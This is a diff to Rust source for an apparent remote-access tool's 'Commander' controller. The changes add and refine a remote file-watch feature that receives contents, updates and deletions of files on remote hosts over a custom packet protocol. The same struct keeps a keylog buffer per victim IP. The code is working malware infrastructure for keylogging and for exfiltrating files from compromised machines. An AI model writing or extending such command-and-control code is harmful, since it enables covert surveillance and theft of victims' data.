@@ -56,6 +56,8 @@ pub struct Commander {
     running: Arc<AtomicBool>,
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
+    file_watch_active: bool,           // ADD THIS
+    file_watch_path: Option<String>,
 }
 
 impl Commander {
@@ -71,6 +73,8 @@ impl Commander {
             running: Arc::new(AtomicBool::new(true)),
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
+            file_watch_active: false,      // ADD THIS
+            file_watch_path: None,
         }
     }
 
@@ -509,7 +513,7 @@ impl Commander {
         
         println!("[+] Watch request sent. Receiving initial file content...");
         
-        // Receive initial file content (reuse same mechanism as download_file)
+        // Receive initial file content
         let mut file_data = Vec::new();
         let start = Instant::now();
         let mut chunk_count = 0;
@@ -552,7 +556,6 @@ impl Commander {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
                     // Check for delete marker (0x72 = file deleted)
                     if data.len() >= 1 && data[0] == 0x72 {
-                        // Move to deleted folder with timestamp
                         let timestamp = Instant::now().duration_since(watch_start).as_secs();
                         let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
                         
@@ -575,9 +578,15 @@ impl Commander {
                     
                     // Check for update marker (0x73 = file updated)
                     if data.len() >= 1 && data[0] == 0x73 {
-                        // Rest of data is new file content
-                        let content = &data[1..];
-                        if !content.is_empty() || data.len() == 1 {
+                        // Find where the actual content ends (before 0xFF if present)
+                        let content_end = data.iter()
+                            .position(|&b| b == 0xFF)
+                            .unwrap_or(data.len());
+                        
+                        // Extract content (skip 0x73 marker, stop before 0xFF)
+                        let content = &data[1..content_end];
+                        
+                        if !content.is_empty() {
                             match std::fs::write(&local_path, content) {
                                 Ok(_) => {
                                     let elapsed = Instant::now().duration_since(last_update);
@@ -592,17 +601,15 @@ impl Commander {
                         continue;
                     }
                     
-                    // Regular file chunk (continuation of update)
+                    // End of update marker (0xFF) - just clear buffer
                     if data.len() == 1 && data[0] == 0xFF {
-                        // End of update marker
                         println!("[+] File update complete");
                         self.keylog_buffer.remove(&ip);
                         continue;
                     }
                     
-                    // Regular data chunk
-                    if !data.is_empty() && data[0] != 0xFF {
-                        file_data.extend_from_slice(data);
+                    // Regular data chunk (shouldn't happen in watch mode, but handle it)
+                    if !data.is_empty() && data[0] != 0xFF && data[0] != 0x73 && data[0] != 0x72 {
                         self.keylog_buffer.remove(&ip);
                     }
                 }
@@ -613,7 +620,7 @@ impl Commander {
         // Send stop watching command
         println!("[*] Stopping file watch...");
         let mut stop_request = Vec::new();
-        stop_request.push(0x74); // Stop watch marker
+        stop_request.push(0x74);
         stop_request.push(remote_path.as_bytes().len() as u8);
         stop_request.extend_from_slice(remote_path.as_bytes());
         let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
